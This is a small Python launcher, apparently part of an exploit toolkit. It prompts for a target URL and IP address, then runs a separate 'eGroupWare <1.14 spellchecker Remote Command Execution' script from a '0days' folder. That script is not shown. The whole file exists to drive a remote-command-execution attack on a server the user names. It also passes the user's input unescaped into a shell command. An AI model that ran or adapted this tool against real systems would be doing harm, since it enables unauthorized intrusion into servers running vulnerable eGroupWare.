#Usage:exploit.py <http/s> <IP> 
import subprocess as sub

class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'


def main():
    url = input(f"{Colors.red}(eGroupWare <1.14 spellchecker Remote Command Execution){Colors.end} [Enter Target URL:~#")
    ip = input(f"{Colors.red}(eGroupWare <1.14 spellchecker Remote Command Execution){Colors.end} [Enter Target Ip Address:~#")
    sub.call(f"python3 ../0days/eGroupWare-1.14-spellchecker-RCE.py {url} {ip}", shell=True)

main()